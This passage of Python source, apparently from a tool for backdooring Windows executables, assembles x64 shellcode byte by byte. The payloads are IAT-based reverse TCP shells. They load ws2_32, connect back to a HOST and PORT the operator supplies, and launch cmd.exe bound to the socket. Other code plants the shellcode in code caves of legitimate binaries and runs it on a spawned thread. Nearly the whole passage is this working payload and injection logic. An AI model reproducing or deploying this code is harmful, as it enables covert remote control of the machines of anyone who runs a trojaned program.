                           "\x4d\x89\xc1"                                   # mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                                                                            #                             ; r8 = lpProcessAttributes (NULL)
                                                                            #                             ; rdx = the lpCommandLine to point to "cmd",0
                           "\x4c\x89\xc1"                                   # mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
                           "\x48\x83\xEC\x20"                               # sub rsp, 20
                           "\x41\xFF\xD4"                                   # call r12                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
                           # perform the call to WaitForSingleObject
                           "\xeb\x14"                                       # jmp over WaitForSingleObject
                           "\x57\x61\x69\x74\x46\x6f\x72\x53"               # WaitForSingleObject
                           "\x69\x6e\x67\x6c\x65\x4f\x62\x6a"               # ...
                           "\x65\x63\x74\x00"                               # ...
                           "\x48\x8D\x15\xE5\xFF\xFF\xFF"                   # lea rdx, [rip-27]
                           "\x4C\x89\xE9"                                   # mov rcx, r13 ; mov kernel32 handle to rcx
                           "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                           "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WaitForSingleObject
                           # WaitForSingleObject is in rax
                           "\x48\x31\xd2"                                   # xor rdx, rdx
                           "\x8b\x0e"                                       # mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
                           "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                           "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                           #Fix Up rsp
                           "\x48\x81\xC4\x50\x01\x00\x00"                   # add rsp, 0x150 
                           )
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def iat_reverse_tcp_inline_threaded(self, flItms, CavesPicked={}):
        """
        Complete IAT based payload includes spawning of thread.
        """

        flItms['stager'] = True

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'CreateThread', 'VirtualAlloc']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )
        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        self.shellcode2 += "\xfc"                   # CLD
        self.shellcode2 += "\x55\x48\x89\xE5"       # push rbp, mov rpp, rsp
        self.shellcode2 += "\x48\x31\xD2"           # xor rdx, rdx
        self.shellcode2 += "\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.shellcode2 += "\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]
        # rdx now module entry
        self.shellcode2 += "\x49\xBE"           # mov value below to r14

        if flItms['LoadLibraryA'] - flItms['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (flItms['LoadLibraryA'] - flItms['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", flItms['LoadLibraryA'] - flItms['ImageBase'])
        #RDX holds entry point
        self.shellcode2 += "\x49\x01\xD6"  # add r14 + RDX
        self.shellcode2 += "\x49\xBF"  # mov value below to r15
        if flItms['GetProcAddress'] - flItms['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (flItms['GetProcAddress'] - flItms['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", flItms['GetProcAddress'] - flItms['ImageBase'])
        self.shellcode2 += "\x49\x01\xD7"  # add r15 + RDX
        #LoadLibraryA in r14
        #GetProcAddress in r15

        '''
        Winx64 asm calling convention
        RCX, RDX, R8, R9 for the first four integer or pointer arguments (in that order),
        and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments
        are pushed onto the stack (right to left). Integer return values (similar to x86) are
        returned in RAX if 64 bits or less. Floating point return values are returned in XMM0.
        Parameters less than 64 bits long are not zero extended; the high bits are not zeroed.

        The caller reserves space on the stack (unlike x86)
        rbx
        rbp
        r12
        r13
        r14: GetProcAddress
        r15: LoadLibraryA

        '''

        self.shellcode2 += ("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            )
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20

                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);

                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            "\x48\x81\xC4\xb8\x02\x00\x00"                   # add rsp, 0x2b8

                            )
        #socket is in r12

        self.shellcode2 += ("\xeb\x09"                                        # jump over kernel32
                            "\x6b\x65\x72\x6e\x65\x6c\x33\x32\x00"           # kernel32,00
                            "\x48\x8D\x0D\xF0\xFF\xFF\xFF"                   # lea rcx, [rip-4]
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\x16"                                   # call qword ptr [r14]
                            # getprocaddress CreateProcessA
                            "\x49\x89\xC5"                                   # mov r13, rax ; mov kernel32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0f"                                       # jump over CreateProcessA,0
                            "\x43\x72\x65\x61\x74\x65\x50"                   # CreateProcessA
                            "\x72\x6f\x63\x65\x73\x73\x41\x00"               # ...
                            "\x48\x8D\x15\xEA\xFF\xFF\xFF"                   # lea rdx, [rip - 22]
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr CreateProcessA
                            # CreateProcessesA in rax
                            "\x48\x89\xC7"                                   # mov rdi, rax ;mov CreateProcessA to rdi
                            "\x49\x87\xFC"                                   # xchg r12, rdi (socket handle for CreateProcessA)
                            # socket is in rdi
                            # shell:
                            "\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00"       # mov r8, 'cmd'
                            "\x41\x50"                                       # push r8                     ; an extra push for alignment
                            "\x41\x50"                                       # push r8                     ; push our command line: 'cmd',0
                            "\x48\x89\xe2"                                   # mov rdx, rsp                ; save a pointer to the command line
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdError
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdOutput
                            "\x57"                                           # push rdi                    ; our socket becomes the shells hStdInput
                            "\x4d\x31\xc0"                                   # xor r8, r8                  ; Clear r8 for all the NULL's we need to push
                            "\x6a\x0d"                                       # push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
                            "\x59"                                           # pop rcx                     ; Set RCX for the loop
                            # 1 push_loop:                    ;
                            "\x41\x50"                                       # push r8                     ; push a null qword
                            "\xe2\xfc"                                       # loop push_loop              ; keep looping untill we have pushed enough nulls
                            "\x66\xc7\x44\x24\x54\x01\x01"                   # mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
                            "\x48\x8d\x44\x24\x18"                           # lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
                            "\xc6\x00\x68"                                   # mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
                            "\x48\x89\xe6"                                   # mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure
                            #   ; 1 perform the call to CreateProcessA
                            "\x56"                                           # push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure
                            "\x50"                                           # push rax                    ; Push the pointer to the STARTUPINFO Structure
                            "\x41\x50"                                       # push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
                            "\x41\x50"                                       # push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
                            "\x41\x50"                                       # push r8                     ; We dont specify any dwCreationFlags
                            "\x49\xff\xc0"                                   # inc r8                      ; Increment r8 to be one
                            "\x41\x50"                                       # push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
                            "\x49\xff\xc8"                                   # dec r8                      ; Decrement r8 (third param) back down to zero
                            "\x4d\x89\xc1"                                   # mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                                                                             #                             ; r8 = lpProcessAttributes (NULL)
                                                                             #                             ; rdx = the lpCommandLine to point to "cmd",0
                            "\x4c\x89\xc1"                                   # mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
                            "\x48\x83\xEC\x20"                               # sub rsp, 20
                            "\x41\xFF\xD4"                                   # call r12                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
                            # perform the call to WaitForSingleObject
                            "\xeb\x14"                                       # jmp over WaitForSingleObject
                            "\x57\x61\x69\x74\x46\x6f\x72\x53"               # WaitForSingleObject
                            "\x69\x6e\x67\x6c\x65\x4f\x62\x6a"               # ...
                            "\x65\x63\x74\x00"                               # ...
                            "\x48\x8D\x15\xE5\xFF\xFF\xFF"                   # lea rdx, [rip-27]
                            "\x4C\x89\xE9"                                   # mov rcx, r13 ; mov kernel32 handle to rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WaitForSingleObject
                            # WaitForSingleObject is in rax
                            "\x48\x31\xd2"                                   # xor rdx, rdx
                            "\x48\xFF\xCA"                                   # dec rdx
                            "\x8b\x0e"                                       # mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD0"                                       # call rax; WaitForSingleObject( pi.hProcess, INFINITE );
                            #Fix Up rsp
                            #"\x48\x81\xC4\x08\x04\x00\x00"                   # add rsp, 0x408
                            )
                            # ADD EXITFUNC HERE THREAD
        #kernel32 handle in r13
        #LoadLibraryA in r14
        #GetProcAddress in r15
        # just try exitthread...
        self.shellcode2 += ("\xeb\x0b"
                            "\x47\x65\x74\x56\x65"
                            "\x72\x73\x69\x6f\x6e\x00"                  # GetVersion
                            "\x48\x8D\x15\xEE\xFF\xFF\xFF"              # lea rdx, [rip-16]
                            "\x4C\x89\xE9"                              # mov rcx, r13 ; mov kernel32 handle to rcx
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xFF\x17"                              # call qword ptr [r15] GetProcAddr GetVersion
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\xff\xd0"                                  # call rax (getversion)
                            "\x83\xf8\x06"                              # cmp al, 6
                            "\x7d\x19"                                  # jl short to ntdll
                            "\xeb\x0b"
                            "\x45\x78\x69\x74\x54"                      # ...
                            "\x68\x72\x65\x61\x64\x00"                  # ExitThread
                            "\x48\x8D\x15\xEE\xFF\xFF\xFF"              # lea rdx, [rip -16]
                            "\x4C\x89\xE9"                              # mov rcx, r13 ..add mov kernel32 to rcx
                            "\xeb\x34"                                  # jmp short to su rsp for getprocaddress
                            "\xeb\x06"                                  # jmp short over ntdll
                            "\x6e\x74\x64\x6c\x6c\x00"                      # ntdll
                            "\x48\x8D\x0D\xF3\xFF\xFF\xFF"              # lea rcx, [rip -13]
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xff\x16"                              # call qword ptr [r14] LoadlibA ntdll
                            "\x48\x89\xc1"                              # mov rcx, rax
                            "\xeb\x12"                                  # jmp over RtlExitUserThread
                            "\x52\x74\x6c\x45\x78\x69\x74\x55\x73"      # RtlExitUserThread
                            "\x65\x72\x54\x68\x72\x65\x61\x64\x00"      # ...
                            "\x48\x8D\x15\xE7\xFF\xFF\xFF"              # lea rdx, [rip -16]
                            "\x48\x83\xEC\x20"                          # sub rsp, 0x20
                            "\x41\xFF\x17"                              # call qword ptr [r15] GetProcAddr RtlExitUserThread or ExitThread
                            "\x48\x31\xc9"                              # xor rcx, rcx
                            "\xff\xd0"                                  # call rax
                            )
        #Virtual ALLOC Code BELOW

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\x90"                              # <--THAT'S A NOP. \o/
                           "\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           #api_call
                           "\x41\x51"                          # push r9
                           "\x41\x50"                          # push r8
                           "\x52"                              # push rdx
                           "\x51"                              # push rcx
                           "\x56"                              # push rsi
                           "\x48\x31\xD2"                      # xor rdx,rdx
                           "\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           "\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           "\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           #next_mod
                           "\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           "\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           "\x4d\x31\xc9"                      # xor r9,r9
                           #loop_modname
                           "\x48\x31\xc0"                      # xor rax,rax
                           "\xac"                              # lods
                           "\x3c\x61"                          # cmp al, 61h (a)
                           "\x7c\x02"                          # jl 02
                           "\x2c\x20"                          # sub al, 0x20
                           #not_lowercase
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           "\x41\x01\xc1"                      # add r9d, eax
                           "\xe2\xed"                          # loop until read, back to xor rax, rax
                           "\x52"                              # push rdx ; Save the current position in the module list for later
                           "\x41\x51"                          # push r9 ; Save the current module hash for later
                                                               # ; Proceed to iterate the export address table,
                           "\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           "\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           "\x48\x85\xc0"                      # test rax, rax ; Test if no export address table is present
                           "\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the next module
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           "\x50"                              # push rax ; Save the current modules EAT
                           "\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function names
                           "\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function names
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                               #; Computing the module hash + function hash
                           #get_next_func: ;
                           "\xe3\x56"                          # jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                           "\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           "\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           "\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                               #  ; And compare it to the one we wan
                           #loop_funcname: ;
                           "\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           "\xac"                              # lodsb ; Read in the next byte of the ASCII function name
                           "\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           "\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           "\x38\xe0"                          # cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                           "\x75\xf1"                          # jne loop_funcname ; If we have not reached the null terminator, continue
                           "\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash to the function hash
                           "\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                           "\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash if we have not found it
                                                               # ; If found, fix up stack, call the function and then value else compute the next one...
                           "\x58"                              # pop rax ; Restore the current modules EAT
                           "\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           "\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the function addresses table rva
                           "\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           "\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                           "\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get the functions actual VA
                                                               #; We now fix up the stack and perform the call to the drsired function...
                           #finish:
                           "\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           "\x41\x58"                          # pop r8 ; Clear off the current position in the module list
                           "\x5E"                              # pop rsi ; Restore RSI
                           "\x59"                              # pop rcx ; Restore the 1st parameter
                           "\x5A"                              # pop rdx ; Restore the 2nd parameter
                           "\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           "\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           "\x41\x5A"                          # pop r10 ; pop off the return address
                           "\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                               # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                           "\x41\x52"                          # push r10 ; push back the return address
                           "\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                               # ; We now automagically return to the correct caller...
                           #get_next_mod: ;
                           "\x58"                              # pop rax ; Pop off the current (now the previous) modules EAT
                           #get_next_mod1: ;
                           "\x41\x59"                          # pop r9 ; Pop off the current (now the previous) modules hash
                           "\x5A"                              # pop rdx ; Restore our position in the module list
                           "\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           "\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        #allocate
        self.shellcode1 += ("\x5d"                              # pop rbp
                            "\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x6a\x40"                          # push 40h
                            "\x41\x59"                          # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              # push 1000h
                            "\x41\x58"                          # pop r8.. now 1000h
                            "\x4C\x89\xF2"                      # mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              # push E553a458
                            "\x41\x5A"                          # pop r10
                            "\xff\xd5"                          # call rbp
                            "\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )
                            ##mov rcx, 0x1ab
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                  # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0"  # xor rax,rax

                            "\x50"                                  # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          # mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              # call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
        """
        Completed IAT based payload includes spawning of thread.
        """

        flItms['stager'] = True

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'VirtualAlloc', 'CreateThread']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )
        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 99).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 99).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 71).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xBA\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        self.shellcode2 += "\xfc"                   # CLD
        self.shellcode2 += "\x55\x48\x89\xE5"       # mov rbp, rsp
        self.shellcode2 += "\x48\x31\xD2"           # xor rdx, rdx
        self.shellcode2 += "\x65\x48\x8B\x52\x60"   # mov rdx, QWORD ptr gs: [rdx+0x60]
        self.shellcode2 += "\x48\x8B\x52\x10"       # mov rdx, Qword ptr [rdx + 10]
        # rdx now module entry
        self.shellcode2 += "\x49\xBE"               # mov value below to r14

        if flItms['LoadLibraryA'] - flItms['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (flItms['LoadLibraryA'] - flItms['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", flItms['LoadLibraryA'] - flItms['ImageBase'])
        #RDX holds entry point
        self.shellcode2 += "\x49\x01\xD6"           # add r14 + RDX
        self.shellcode2 += "\x49\xBF"               # mov value below to r15
        if flItms['GetProcAddress'] - flItms['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (flItms['GetProcAddress'] - flItms['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", flItms['GetProcAddress'] - flItms['ImageBase'])
        self.shellcode2 += "\x49\x01\xD7"           # add r15 + RDX
        # LoadLibraryA in r14
        # GetProcAddress in r15

        self.shellcode2 += ("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"       # mov r11, ws2_32
                            "\x41\x53"                                       # push r11
                            "\x49\x89\xE3"                                   # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                   # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                   # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            )
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x57"                                           # push rdi
                            "\x48\x89\xE7"                                   # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                   # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xff\x16"                                   # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                   # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
